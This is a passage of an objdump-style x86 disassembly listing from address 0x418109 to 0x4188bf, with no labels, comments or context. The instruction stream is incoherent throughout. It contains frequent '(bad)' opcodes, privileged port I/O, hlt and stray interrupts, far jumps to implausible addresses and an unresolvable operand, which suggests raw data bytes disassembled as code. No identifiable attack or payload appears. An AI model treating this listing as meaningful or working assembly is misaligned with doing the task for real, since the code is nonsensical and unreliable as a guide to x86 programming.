  418109:	loopne 0x41815d
  41810b:	xchg   ecx,eax
  41810c:	fcmovnb st,st(6)
  41810e:	pop    ss
  41810f:	scas   al,BYTE PTR es:[edi]
  418110:	sar    esp,1
  418112:	mov    BYTE PTR [ecx+0x29],cl
  418115:	scas   eax,DWORD PTR es:[edi]
  418116:	xchg   edi,eax
  418117:	pop    eax
  418118:	xchg   ebx,eax
  418119:	sub    eax,0x9910c845
  41811e:	pop    ss
  41811f:	test   eax,0x2441f45c
  418124:	int    0xe5
  418126:	jnp    0x418152
  418128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418129:	and    DWORD PTR [ecx+0x6],eax
  41812c:	shr    esi,1
  41812e:	inc    edi
  41812f:	push   ecx
  418130:	aad    0xd3
  418132:	and    al,0x5c
  418134:	xchg   esp,eax
  418135:	mov    fs:0x6549e06a,eax
  41813b:	shr    BYTE PTR [ecx-0x3e],cl
  41813e:	jns    0x418157
  418140:	push   esp
  418141:	loop   0x41816a
  418143:	es cmp eax,0x1d881cce
  418149:	rol    DWORD PTR ds:0x42ad22cb,1
  41814f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418150:	ds sub al,0x2b
  418153:	ret    0x21d
  418156:	mov    ds:0x9bd7e5bc,al
  41815b:	cs jecxz 0x418155
  41815e:	popf   
  41815f:	mov    ebx,0x490d367
  418164:	in     al,dx
  418165:	jb     0x41816d
  418167:	xchg   ch,cl
  418169:	cmc    
  41816a:	(bad)  
  41816b:	(bad)  
  41816c:	in     al,dx
  41816d:	push   edi
  41816e:	sub    edx,DWORD PTR [eax+esi*2-0x7eacd9ac]
  418175:	nop
  418176:	push   esp
  418177:	push   edi
  418178:	jno    0x4181e5
  41817a:	ds test edx,0xe8ee218d
  418181:	mov    cl,0x6e
  418183:	adc    dh,BYTE PTR [ecx+ecx*8-0x1be236a8]
  41818a:	aaa    
  41818b:	mov    DWORD PTR [ebx],esi
  41818d:	adc    eax,0x7e0e325d
  418192:	cmp    BYTE PTR [esi-0x50],0xcd
  418196:	or     eax,0xf6b44783
  41819b:	xor    BYTE PTR [edx],bl
  41819d:	ins    DWORD PTR es:[edi],dx
  41819e:	shl    BYTE PTR [edx],0x14
  4181a1:	jmp    0xb248:0x1f68e331
  4181a8:	(bad)  
  4181a9:	shl    DWORD PTR [eax+esi*8+0x17098726],cl
  4181b0:	lds    ebp,FWORD PTR [edx-0x5e]
  4181b3:	adc    DWORD PTR [esi],edx
  4181b5:	lds    ebp,FWORD PTR [di]
  4181b8:	enter  0xa1fa,0x24
  4181bc:	rcr    DWORD PTR [esi-0x27],1
  4181bf:	push   ds
  4181c0:	adc    eax,0x6971b74c
  4181c5:	push   edx
  4181c6:	popa   
  4181c7:	(bad)  
  4181c9:	sub    BYTE PTR [eax],dl
  4181cb:	gs clc 
  4181cd:	jnp    0x418231
  4181cf:	push   edi
  4181d0:	xchg   BYTE PTR [esi+0x63f7b1a4],dh
  4181d6:	cmp    eax,DWORD PTR [eax+ebp*1-0x10444d29]
  4181dd:	fimul  WORD PTR [edi+0x1179107f]
  4181e3:	hlt    
  4181e4:	mul    BYTE PTR [ebx]
  4181e6:	scas   eax,DWORD PTR es:[edi]
  4181e7:	mov    WORD PTR [edi+0x8],es
  4181ea:	fcmovnb st,st(0)
  4181ec:	push   edx
  4181ed:	fwait
  4181ee:	mov    ah,0x75
  4181f0:	mov    eax,0x6add792b
  4181f5:	sub    BYTE PTR [eax-0x21],0x4
  4181f9:	mov    dl,0x18
  4181fb:	pop    ebp
  4181fc:	ja     0x4181a0
  4181fe:	lea    ecx,[edi-0x554246dd]
  418204:	inc    eax
  418205:	push   ebp
  418206:	int    0xd1
  418208:	jae    0x418228
  41820a:	pop    edx
  41820b:	call   DWORD PTR [ebx]
  41820d:	jp     0x41823c
  41820f:	cld    
  418210:	xchg   esi,eax
  418211:	dec    ecx
  418212:	cmp    DWORD PTR [ecx+0x5c],esi
  418215:	inc    esi
  418216:	out    dx,al
  418217:	and    ch,bh
  418219:	lock mov ah,0x5a
  41821c:	xor    al,0x17
  41821e:	pop    ebp
  41821f:	push   eax
  418220:	lds    ebx,FWORD PTR [ebx]
  418222:	xchg   ah,ah
  418224:	push   edx
  418225:	cmp    dl,BYTE PTR [edx-0x7a]
  418228:	ins    BYTE PTR es:[edi],dx
  418229:	imul   edi,DWORD PTR ds:0x4da37659,0x478a4a93
  418233:	loope  0x41827b
  418235:	ror    BYTE PTR [edx+0x17],0x69
  418239:	retf   
  41823a:	xor    eax,0xd4eb4587
  41823f:	jl     0x418286
  418241:	arpl   dx,bx
  418243:	aam    0xb8
  418245:	or     DWORD PTR [edi+0x15dc7612],0xffffffff
  41824c:	stos   BYTE PTR es:[edi],al
  41824d:	pop    ebx
  41824e:	mov    al,ds:0x6b8fdee3
  418253:	pop    ds
  418254:	imul   ebp,esp,0xffffffb3
  418257:	lods   eax,DWORD PTR ds:[esi]
  418258:	push   cs
  418259:	hlt    
  41825a:	push   cs
  41825b:	xchg   ecx,eax
  41825c:	xor    BYTE PTR ds:0x6f410d4,bl
  418262:	add    eax,DWORD PTR [edx-0x53]
  418265:	sbb    al,0xb2
  418267:	inc    edi
  418268:	cmc    
  418269:	fucomp st(2)
  41826b:	out    0x17,al
  41826d:	cmp    ah,BYTE PTR [ecx+0x19]
  418270:	stc    
  418271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418272:	inc    ebp
  418273:	stos   BYTE PTR es:[edi],al
  418274:	inc    edx
  418275:	ss push es
  418277:	shl    BYTE PTR [ebx],cl
  418279:	clc    
  41827a:	push   edi
  41827b:	xor    eax,0xdf317783
  418280:	xchg   edx,eax
  418281:	into   
  418282:	add    BYTE PTR [ebx-0x67],ah
  418285:	adc    bl,BYTE PTR [edx]
  418287:	ror    DWORD PTR [ecx-0x5b],0x51
  41828b:	cmp    eax,DWORD PTR [ecx]
  41828d:	ds test eax,0xda5ef141
  418293:	or     ebp,edx
  418295:	and    esi,DWORD PTR [edi+0x6a]
  418298:	jns    0x41826a
  41829a:	xor    DWORD PTR [esi],edx
  41829c:	xchg   esi,eax
  41829d:	mov    ebx,0xf0a9dc2
  4182a2:	aam    0x1b
  4182a4:	pushf  
  4182a5:	push   ebx
  4182a6:	lahf   
  4182a7:	push   ss
  4182a8:	and    al,0x28
  4182aa:	xor    DWORD PTR [ecx-0x3],ebx
  4182ad:	jno    0x41824d
  4182af:	mov    esp,cs
  4182b1:	or     DWORD PTR [eax-0x4ae1039d],edx
  4182b7:	pushf  
  4182b8:	xor    cl,BYTE PTR [edi]
  4182ba:	mov    edi,0x193d8fcf
  4182bf:	fld    st(0)
  4182c1:	jmp    0x4182d6
  4182c3:	adc    ebp,eax
  4182c5:	xor    BYTE PTR [ecx],bl
  4182c7:	mov    cl,0x1f
  4182c9:	stc    
  4182ca:	push   ebp
  4182cb:	jne    0x418276
  4182cd:	stos   DWORD PTR es:[edi],eax
  4182ce:	js     0x418265
  4182d0:	test   eax,0x15eeaefa
  4182d5:	adc    dl,BYTE PTR [edx-0x72]
  4182d8:	gs mov eax,0xd36aa2ec
  4182de:	push   edx
  4182df:	inc    eax
  4182e0:	xchg   BYTE PTR [ebx],ah
  4182e2:	sbb    BYTE PTR ds:0x9d82faeb,cl
  4182e8:	cld    
  4182e9:	xchg   edi,eax
  4182ea:	mov    WORD PTR [ebp-0x50],es
  4182ed:	jns    0x418357
  4182ef:	dec    ebp
  4182f0:	(bad)  
  4182f1:	leave  
  4182f2:	cdq    
  4182f3:	call   DWORD PTR [ebx+0x4b690bff]
  4182fa:	jge    0x418355
  4182fc:	enter  0x4cb,0x7
  418300:	and    edi,DWORD PTR [edi]
  418302:	(bad)
  418305:	xor    esp,DWORD PTR [edx]
  418307:	sar    bl,cl
  418309:	jle    0x4182f9
  41830b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41830c:	mov    esp,0x1f71fe9f
  418311:	imul   esp,DWORD PTR [ecx-0x68],0xfffffff2
  418315:	sub    ah,BYTE PTR [ebx+edx*2-0x3e21d652]
  41831c:	dec    ecx
  41831d:	test   DWORD PTR [esi+0x64],0x6746ac9e
  418324:	dec    edi
  418325:	fdivr  QWORD PTR [ecx+0x404d8fba]
  41832b:	inc    BYTE PTR [ebx-0x5c0a4644]
  418331:	dec    esp
  418332:	imul   edi,DWORD PTR [eax-0x7f],0x59
  418336:	mov    ebp,esi
  418338:	mov    ch,0xa9
  41833a:	pusha  
  41833b:	mov    edi,0x38a9df6f
  418340:	cmp    eax,0x651c3296
  418345:	scas   al,BYTE PTR es:[edi]
  418346:	mov    edx,0x34d6a28c
  41834b:	cmp    eax,0xea8c2ccb
  418350:	in     eax,dx
  418351:	mov    edx,0xbdd1582
  418356:	adc    al,0x56
  418358:	addr16 data16 jp 0x4183a5
  41835c:	std    
  41835d:	out    dx,eax
  41835e:	(bad)  
  41835f:	sub    DWORD PTR [edi-0x3d1f7236],esp
  418365:	dec    eax
  418366:	adc    al,0xc1
  418368:	mov    ds:0x9be0f93b,eax
  41836d:	je     0x41835f
  41836f:	cmp    DWORD PTR [edi+0x306e0328],esp
  418375:	test   cl,dl
  418377:	cwde   
  418378:	add    al,BYTE PTR ds:0x269f73a2
  41837e:	mov    bl,0xc9
  418380:	aad    0x94
  418382:	xchg   ecx,eax
  418383:	ret    
  418384:	pop    esi
  418385:	mov    bl,0x8c
  418387:	xchg   dh,ch
  418389:	rol    BYTE PTR [edi],0x24
  41838c:	xchg   esp,eax
  41838d:	(bad)  
  418391:	jae    0x41833e
  418393:	inc    eax
  418394:	sbb    esp,0xffffffb3
  418397:	gs xchg edi,eax
  418399:	pop    ds
  41839a:	(bad)  
  41839b:	scas   al,BYTE PTR es:[edi]
  41839c:	lods   al,BYTE PTR ds:[esi]
  41839d:	mov    ecx,DWORD PTR [ebx+0x58]
  4183a0:	pop    ebp
  4183a1:	or     dh,dl
  4183a3:	xchg   ecx,eax
  4183a4:	sbb    eax,0xd1922e46
  4183a9:	push   ecx
  4183aa:	sbb    ebp,edi
  4183ac:	sub    ecx,DWORD PTR [edi-0x78]
  4183af:	ss pop edi
  4183b1:	outs   dx,BYTE PTR ds:[esi]
  4183b2:	mov    ebx,0xb9193636
  4183b7:	fs pop ds
  4183b9:	jg     0x41843a
  4183bb:	arpl   bp,sp
  4183bd:	add    BYTE PTR [eax],al
  4183bf:	add    BYTE PTR [eax],al
  4183c1:	add    BYTE PTR [esi-0x144a9dc3],dl
  4183c7:	call   edi
  4183c9:	aas    
  4183ca:	popa   
  4183cb:	adc    ch,cl
  4183cd:	add    DWORD PTR [edx-0x1b],0xffffffa4
  4183d1:	pusha  
  4183d2:	add    al,0x1
  4183d4:	add    DWORD PTR [eax],eax
  4183d6:	repz add al,0x0
  4183d9:	add    bl,dh
  4183db:	inc    eax
  4183dc:	jb     0x41835e
  4183de:	pop    esp
  4183df:	mov    ecx,0x835a1d98
  4183e4:	pusha  
  4183e5:	push   ebx
  4183e6:	mov    bl,ah
  4183e8:	and    eax,0x95f2173a
  4183ed:	lahf   
  4183ee:	push   ds
  4183ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183f0:	ja     0x41843d
  4183f2:	jmp    0x4183dd
  4183f4:	mov    esp,DWORD PTR [ebx-0x202a089f]
  4183fa:	adc    dl,ah
  4183fc:	xchg   esi,eax
  4183fd:	out    dx,eax
  4183fe:	jl     0x41847b
  418400:	mov    esp,0x16eca46
  418405:	stos   DWORD PTR es:[edi],eax
  418406:	shl    bl,1
  418408:	lods   al,BYTE PTR ds:[esi]
  418409:	lds    edi,FWORD PTR [ecx+eax*8+0x28]
  41840d:	rol    DWORD PTR [eax+0x12e25c06],cl
  418413:	mov    cl,BYTE PTR [ebx]
  418415:	daa    
  418416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418417:	push   es
  418418:	in     al,dx
  418419:	div    BYTE PTR [edi+0x564bb693]
  41841f:	loopne 0x41846f
  418421:	inc    edx
  418422:	mov    bl,ch
  418424:	push   ebp
  418425:	in     eax,dx
  418426:	sbb    ebx,DWORD PTR [edi-0x54904db6]
  41842c:	out    0x23,eax
  41842e:	nop
  41842f:	jmp    0x6dd0cb05
  418434:	fscale 
  418436:	mov    ds:0x16e95db2,al
  41843b:	aaa    
  41843c:	mov    edx,0xd5f3b221
  418441:	xchg   edx,eax
  418442:	push   esp
  418443:	sub    BYTE PTR [eax],ah
  418445:	bound  edi,QWORD PTR [edi]
  418447:	push   0x1ae51289
  41844c:	ins    DWORD PTR es:[edi],dx
  41844d:	test   BYTE PTR [ebp+0x7e],dh
  418450:	and    al,0xb3
  418452:	(bad)  
  418453:	pop    esp
  418454:	sti    
  418455:	jae    0x418400
  418457:	or     ebp,DWORD PTR [edx-0x3e170fa1]
  41845d:	adc    eax,0xdcefdc7
  418462:	sbb    ecx,DWORD PTR [edx-0x53]
  418465:	gs push edx
  418467:	mov    cl,bh
  418469:	mov    DWORD PTR [ebp+0x29],ebx
  41846c:	js     0x41841f
  41846e:	push   ds
  41846f:	lahf   
  418470:	ja     0x4184ee
  418472:	lds    edx,FWORD PTR [edi-0x58]
  418475:	fwait
  418476:	xchg   BYTE PTR [edx+0x26],dh
  418479:	mov    WORD PTR [di+0x68],fs
  41847d:	xchg   ebp,eax
  41847e:	fstp   QWORD PTR [edi-0x10]
  418481:	popa   
  418482:	(bad)  
  418483:	call   0xa3c403aa
  418488:	loopne 0x41841b
  41848a:	cld    
  41848b:	and    DWORD PTR [edx],ecx
  41848d:	imul   edi,ecx,0xdbdc5dbc
  418493:	jmp    0xe087c34a
  418498:	pop    es
  418499:	inc    ebx
  41849a:	pushf  
  41849b:	add    DWORD PTR [eax+0x7142a5fe],ebx
  4184a1:	pop    edx
  4184a2:	inc    edi
  4184a3:	adc    DWORD PTR [ecx-0x75],ebp
  4184a6:	push   ebx
  4184a7:	jbe    0x4184b8
  4184a9:	jle    0x41843f
  4184ab:	std    
  4184ac:	cld    
  4184ad:	jns    0x4184df
  4184af:	inc    esp
  4184b0:	mov    esi,0x6dc2d572
  4184b5:	sahf   
  4184b6:	or     dh,dl
  4184b8:	aaa    
  4184b9:	nop
  4184ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184bb:	cli    
  4184bc:	pop    edx
  4184bd:	and    DWORD PTR [ebx-0x67],ebp
  4184c0:	xor    ebx,0x20
  4184c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184c4:	jmp    0xa095:0xf1d1de51
  4184cb:	jno    0x41852c
  4184cd:	and    eax,0x8e4d204
  4184d2:	fisttp QWORD PTR [ebp+0x14]
  4184d5:	int3   
  4184d6:	xchg   bh,cl
  4184d8:	int3   
  4184d9:	test   BYTE PTR [ebp+0x60222ad3],bh
  4184df:	inc    esi
  4184e0:	dec    ebx
  4184e1:	out    0x1d,eax
  4184e3:	cmc    
  4184e4:	mov    ah,0x87
  4184e6:	mov    BYTE PTR [esi-0x27],cl
  4184e9:	push   esp
  4184ea:	mov    cl,0x71
  4184ec:	inc    edi
  4184ed:	push   edx
  4184ee:	scas   eax,DWORD PTR es:[edi]
  4184ef:	xchg   ebp,eax
  4184f0:	mov    ds:0x1861c88c,eax
  4184f5:	inc    ecx
  4184f6:	mov    ch,0xdc
  4184f8:	push   eax
  4184f9:	sar    BYTE PTR [esi-0x3d],cl
  4184fc:	mov    ecx,ebx
  4184fe:	pop    ebp
  4184ff:	xchg   al,bh
  418501:	fstp   DWORD PTR [edx]
  418503:	jle    0x41849e
  418505:	cmc    
  418506:	icebp  
  418507:	push   es
  418508:	or     esp,DWORD PTR [eax+0x7f7be16a]
  41850e:	retf   0xf4b7
  418511:	push   0xb
  418513:	add    ecx,0xb7efb81f
  418519:	fsubr  QWORD PTR cs:[eax]
  41851c:	imul   ecx,DWORD PTR [esi],0xffffff82
  41851f:	daa    
  418520:	mov    edx,0xb9719ad5
  418525:	push   ebp
  418526:	pop    ecx
  418527:	mov    ch,0x4b
  418529:	xchg   DWORD PTR [ebx],ebx
  41852b:	pop    ebx
  41852c:	mov    dh,0x44
  41852e:	adc    DWORD PTR [edi+0x50e4e10a],ebx
  418534:	mov    al,al
  418536:	push   ss
  418537:	mov    ebx,0x1276313d
  41853c:	repz mov ds:0xf2c2ecf8,al
  418542:	data16 add al,BYTE PTR [ebx+0x7]
  418546:	sar    cl,0x36
  418549:	jbe    0x418525
  41854b:	pop    esp
  41854c:	push   cs
  41854d:	imul   DWORD PTR [ecx-0x79]
  418550:	scas   eax,DWORD PTR es:[edi]
  418551:	cmp    bh,BYTE PTR [eax]
  418553:	out    dx,eax
  418554:	push   ebx
  418555:	test   cl,bl
  418557:	pop    ecx
  418558:	(bad)  
  418559:	stc    
  41855a:	or     eax,0x50296326
  41855f:	pop    esp
  418560:	dec    ebx
  418561:	enter  0xc563,0xf4
  418565:	fwait
  418566:	sub    al,0x6f
  418568:	bswap  esp
  41856a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41856b:	adc    al,0x6
  41856d:	shr    BYTE PTR [esp+eiz*4+0x63],0x1e
  418572:	ins    DWORD PTR es:[edi],dx
  418573:	dec    eax
  418574:	xchg   ebx,eax
  418575:	mov    edi,0x55d3b7e
  41857a:	enter  0x94d3,0xc8
  41857e:	cmp    dh,BYTE PTR [ebx+0x60]
  418581:	mov    ebx,0xe8c756a7
  418586:	xor    bl,BYTE PTR [esi-0x4cd5684e]
  41858c:	mov    ch,BYTE PTR [ebx-0x3655eb8d]
  418592:	mov    ebp,0x1b08e9f
  418597:	call   0x9bf360c3
  41859c:	into   
  41859d:	cmp    dh,BYTE PTR [eax-0x63]
  4185a0:	sti    
  4185a1:	sub    BYTE PTR [ebx+0x9],al
  4185a4:	or     bh,ch
  4185a6:	cdq    
  4185a7:	cmp    BYTE PTR [eax-0x1d],ch
  4185aa:	lods   al,BYTE PTR ds:[esi]
  4185ab:	xor    DWORD PTR [eax+ebp*1-0x5b],edx
  4185af:	jmp    0xf602be61
  4185b4:	xor    DWORD PTR [edx-0x1b],esi
  4185b7:	mov    al,0x4
  4185b9:	push   ebp
  4185ba:	lods   eax,DWORD PTR ds:[esi]
  4185bb:	sbb    DWORD PTR [eax+0x5d],0x2a
  4185bf:	test   al,0x4
  4185c1:	int    0xa0
  4185c3:	dec    esi
  4185c4:	or     cl,dl
  4185c6:	fwait
  4185c7:	sub    eax,0xbc3c6578
  4185cc:	nop
  4185cd:	cs jb  0x41857e
  4185d0:	sbb    dl,BYTE PTR [ebp-0x80]
  4185d3:	and    eax,DWORD PTR [edi]
  4185d5:	pusha  
  4185d6:	test   dl,ch
  4185d8:	mov    al,ds:0xe27410c8
  4185dd:	dec    ebp
  4185de:	nop
  4185df:	cmp    DWORD PTR [ecx+0x736bb822],esp
  4185e5:	xor    bl,BYTE PTR [edx]
  4185e7:	icebp  
  4185e8:	cmp    esp,DWORD PTR [ebx-0x74d5d21c]
  4185ee:	sahf   
  4185ef:	or     eax,0x69c3b079
  4185f4:	cld    
  4185f5:	cmp    edi,esi
  4185f7:	push   edx
  4185f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185f9:	jge    0x4185c8
  4185fb:	sbb    al,0xab
  4185fd:	retf   
  4185fe:	mov    edi,0xd583c824
  418603:	cmp    ecx,esi
  418605:	popf   
  418606:	idiv   DWORD PTR [ebx+ebx*4+0x7b1c394]
  41860d:	loop   0x41859e
  41860f:	and    edi,ebx
  418611:	jno    0x4185e8
  418613:	ficomp WORD PTR [eax-0x72]
  418616:	fs and al,0x7
  418619:	shl    DWORD PTR [edx+0xa674716],1
  41861f:	mov    ds:0xa745abbc,eax
  418624:	mov    eax,0xd31f6e84
  418629:	into   
  41862a:	push   es
  41862b:	ja     0x4185d3
  41862d:	xchg   ecx,eax
  41862e:	sbb    ebx,eax
  418630:	fnstsw WORD PTR [esi+0x47]
  418633:	jno    0x41862f
  418635:	jp     0x4185cf
  418637:	sub    DWORD PTR [ebx-0x14369096],esp
  41863d:	shr    BYTE PTR [eax-0x73],1
  418640:	lods   al,BYTE PTR ds:[esi]
  418641:	shl    DWORD PTR [eax-0x734340a7],cl
  418647:	outs   dx,BYTE PTR ds:[esi]
  418648:	push   es
  418649:	or     DWORD PTR [ebx+0x69],edi
  41864c:	xchg   ebp,eax
  41864d:	sub    ah,BYTE PTR [ebx+eax*4]
  418650:	popf   
  418651:	jle    0x4185e7
  418653:	sub    eax,0x7bfde810
  418658:	in     eax,0xd2
  41865a:	int3   
  41865b:	in     al,0xce
  41865d:	out    dx,al
  41865e:	in     eax,dx
  41865f:	jnp    0x4186bb
  418661:	aas    
  418662:	mov    edx,0xfccd178b
  418667:	push   cs
  418668:	pushf  
  418669:	mov    ds:0x2a850f4a,eax
  41866e:	add    edx,0x1c2f52e3
  418674:	push   eax
  418675:	jmp    0x41860d
  418677:	pop    ecx
  418678:	sbb    al,0x7a
  41867a:	lods   al,BYTE PTR ds:[esi]
  41867b:	lods   eax,DWORD PTR ds:[esi]
  41867c:	add    BYTE PTR [edi-0x5],ch
  41867f:	aad    0x51
  418681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418683:	sbb    dl,BYTE PTR [ebx+eiz*2+0x241e44e0]
  41868a:	or     eax,0x63194860
  41868f:	pop    ebx
  418690:	mov    BYTE PTR [ebp-0x69e16abe],0x2f
  418697:	aas    
  418698:	lea    ebx,[ecx-0x1f428d1a]
  41869e:	jge    0x418644
  4186a0:	cmc    
  4186a1:	pop    esi
  4186a2:	jae    0x418683
  4186a4:	test   DWORD PTR [eax],edx
  4186a6:	not    BYTE PTR [ecx+0x30d41af2]
  4186ac:	xor    eax,DWORD PTR [eax+edx*4-0x6332137c]
  4186b3:	stc    
  4186b4:	retf   
  4186b5:	add    DWORD PTR [edi-0x28],ecx
  4186b8:	xchg   edx,eax
  4186b9:	and    bl,BYTE PTR [edx]
  4186bb:	into   
  4186bc:	in     eax,0x56
  4186be:	lods   al,BYTE PTR ds:[esi]
  4186bf:	in     al,0xe3
  4186c1:	(bad)
  4186c4:	inc    ebx
  4186c5:	sub    DWORD PTR [eax+0x10bd2ffa],ebx
  4186cb:	sub    ch,bl
  4186cd:	xor    DWORD PTR [ebx-0x1b],edx
  4186d0:	fs xchg ecx,eax
  4186d2:	iret   
  4186d3:	mov    ch,0xb
  4186d5:	shl    DWORD PTR [ebp-0x35],0x91
  4186d9:	mov    dh,0xf3
  4186db:	inc    ebx
  4186dc:	mov    al,dl
  4186de:	sbb    BYTE PTR [eax],bl
  4186e0:	aas    
  4186e1:	shl    DWORD PTR [edi-0x7244c66d],cl
  4186e7:	xchg   ebp,eax
  4186e8:	out    dx,al
  4186e9:	(bad)  
  4186ea:	pop    es
  4186eb:	mov    ecx,0x94d21bd0
  4186f0:	cmp    DWORD PTR ds:0x82a86de8,0x3ebd06e4
  4186fa:	pop    ebx
  4186fb:	sbb    DWORD PTR [eax-0x659f5b28],eax
  418701:	mov    bl,0x29
  418703:	or     ebp,DWORD PTR [eax-0x7ef667c]
  418709:	inc    eax
  41870a:	jmp    0x418761
  41870c:	jno    0x4186d2
  41870e:	push   0x1b0a07ae
  418713:	add    dl,BYTE PTR [eax]
  418715:	mov    edx,0x5f06e0fa
  41871a:	inc    esp
  41871b:	cmp    esp,ebp
  41871d:	mov    dl,BYTE PTR [ebp+0x64]
  418720:	int3   
  418721:	fistp  QWORD PTR [edx+0x78ffb110]
  418727:	fcom   QWORD PTR [eax+0x61]
  41872a:	or     DWORD PTR [ecx+0x5e],edx
  41872d:	mov    edi,0xb50fe6c
  418732:	fwait
  418733:	xor    BYTE PTR [eax],0x18
  418736:	push   ds
  418737:	jnp    0x4187a5
  418739:	ja     0x418737
  41873b:	pop    ebp
  41873c:	rcr    BYTE PTR [ebp+0x3e],0xff
  418740:	ja     0x418717
  418742:	or     ecx,esi
  418744:	addr16 add eax,0x1321c860
  41874a:	inc    ecx
  41874b:	fild   DWORD PTR [edx-0x3]
  41874e:	and    bl,BYTE PTR [edi+0x7d364ca5]
  418754:	mov    eax,ds:0x55648b5f
  418759:	outs   dx,BYTE PTR ds:[esi]
  41875a:	xchg   ebp,eax
  41875b:	fdiv   st,st(2)
  41875d:	xchg   BYTE PTR [ecx],ah
  41875f:	repnz ins DWORD PTR es:[edi],dx
  418761:	sub    ah,BYTE PTR [edx+0x56ccc591]
  418767:	dec    ebp
  418768:	add    BYTE PTR [ebp-0x4b],dl
  41876b:	or     eax,0x4c9c4199
  418770:	pusha  
  418771:	inc    ebx
  418772:	sbb    edi,ebp
  418774:	xchg   edx,eax
  418775:	into   
  418776:	jg     0x41877c
  418778:	mov    ebx,0x29d08189
  41877d:	cmp    ecx,esp
  41877f:	out    dx,al
  418780:	popf   
  418781:	pop    edx
  418782:	push   edi
  418783:	bound  edi,QWORD PTR gs:[ebx+edx*2]
  418787:	sub    BYTE PTR [ecx+0x2],bh
  41878a:	stc    
  41878b:	pop    ss
  41878c:	test   DWORD PTR [edi+eiz*2+0x4cd0b897],0x4809539a
  418797:	es cdq 
  418799:	pusha  
  41879a:	fnstsw WORD PTR [eax+0x7d]
  41879d:	sub    ch,bh
  41879f:	and    eax,0x8b52dcf5
  4187a4:	push   ds
  4187a5:	mov    esi,0x7ce79f6c
  4187aa:	and    DWORD PTR [edi],eax
  4187ac:	dec    edi
  4187ae:	into   
  4187af:	mov    ch,0xf8
  4187b1:	loopne 0x4187d3
  4187b3:	cmp    ebx,esi
  4187b5:	pop    edi
  4187b6:	aad    0xf
  4187b8:	and    DWORD PTR [edi],esp
  4187ba:	xchg   edi,eax
  4187bb:	(bad)  
  4187bc:	(bad)  
  4187bd:	or     BYTE PTR [edi+0x33a02f99],dl
  4187c3:	dec    esp
  4187c4:	jg     0x418772
  4187c6:	mov    ?,WORD PTR [ecx-0x59]
  4187c9:	sbb    eax,0x39978b24
  4187ce:	inc    edi
  4187cf:	and    BYTE PTR [edi],ch
  4187d1:	aad    0xb0
  4187d3:	inc    ebx
  4187d4:	and    ebx,edi
  4187d6:	sbb    edi,ecx
  4187d8:	cld    
  4187d9:	jbe    0x418763
  4187db:	push   eax
  4187dc:	fimul  DWORD PTR [esi+0x5c8d3a2b]
  4187e2:	pop    edx
  4187e3:	imul   esi,DWORD PTR [eax-0x44917b0f],0x4e3fce6
  4187ed:	mov    edx,0xd904e133
  4187f2:	cdq    
  4187f3:	inc    ebx
  4187f4:	pushf  
  4187f5:	add    DWORD PTR [ebx-0x4a],edx
  4187f8:	aam    0xcd
  4187fa:	cmp    DWORD PTR [ebx],ecx
  4187fc:	push   cs
  4187fd:	dec    esi
  4187fe:	xchg   esp,eax
  4187ff:	hlt    
  418800:	dec    esi
  418801:	push   eax
  418802:	fwait
  418803:	call   0xcb915d43
  418808:	mov    ds:0x2eb8d64d,eax
  41880d:	fnstsw WORD PTR [edi]
  41880f:	aas    
  418810:	and    edx,DWORD PTR [edi+0x2c]
  418813:	pop    esp
  418814:	vmulpd ymm3,ymm7,YMMWORD PTR [edx*8-0x1c401e86]
  41881d:	xor    eax,0x9ccfb4bb
  418822:	or     ebx,DWORD PTR [esi+0x2397f5ab]
  418828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418829:	xor    DWORD PTR [edx-0x5f],esp
  41882c:	sub    eax,eax
  41882e:	aaa    
  41882f:	lea    esi,[edx-0x1]
  418832:	sar    BYTE PTR [edi+edx*4+0xd],cl
  418836:	or     al,0xfe
  418838:	push   es
  418839:	push   ecx
  41883a:	mov    al,ds:0x3e965515
  41883f:	js     0x4187e2
  418841:	inc    edi
  418842:	push   cs
  418843:	cmc    
  418844:	hlt    
  418845:	hlt    
  418846:	jge    0x4187d7
  418848:	cmp    eax,0xdf01e161
  41884d:	mov    edi,0xf819ec55
  418852:	jle    0x41887f
  418854:	test   BYTE PTR [eax+ebp*8+0x23],0x9
  418859:	mov    dl,0xc6
  41885b:	shl    BYTE PTR [ebx+0x5f],1
  41885e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41885f:	xchg   DWORD PTR [edx-0x356b5616],ecx
  418865:	sub    al,0xee
  418867:	mov    ds:0x551ed97c,eax
  41886c:	xchg   esi,eax
  41886d:	cmp    al,0x3b
  41886f:	shl    BYTE PTR [ebx-0x31e3d14e],1
  418875:	pop    ebx
  418876:	inc    esp
  418877:	pop    esi
  418878:	mov    edi,0xbe0982be
  41887d:	cmp    DWORD PTR [edx],eax
  41887f:	xor    BYTE PTR [edx],bl
  418881:	outs   dx,DWORD PTR ds:[esi]
  418882:	pushf  
  418883:	lock mov bh,BYTE PTR [ecx]
  418886:	arpl   WORD PTR [eax-0x66d1682f],di
  41888c:	mov    ecx,0xe4e95a68
  418891:	(bad)  
  418892:	(bad)  
  418893:	js     0x418913
  418895:	scas   eax,DWORD PTR es:[edi]
  418896:	jbe    0x418851
  418898:	adc    DWORD PTR [ebx],esp
  41889a:	pop    ebx
  41889b:	push   ss
  41889c:	jl     0x41887d
  41889e:	mov    ecx,0xbab56dc
  4188a3:	sbb    al,0x9d
  4188a5:	adc    eax,0x7f38b3bd
  4188aa:	push   cs
  4188ab:	(bad)  
  4188ac:	rol    DWORD PTR [ebx-0x80],0xf1
  4188b0:	pop    edi
  4188b1:	cmp    al,0x31
  4188b3:	pop    ebx
  4188b4:	inc    ebx
  4188b5:	mov    cl,dh
  4188b7:	and    cl,BYTE PTR [ecx-0x4e]
  4188ba:	fwait
  4188bb:	push   cs
  4188bc:	outs   dx,BYTE PTR ds:[esi]
  4188bd:	out    0x15,al
  4188bf:	lea    esp,[esi+0x2fae0627]
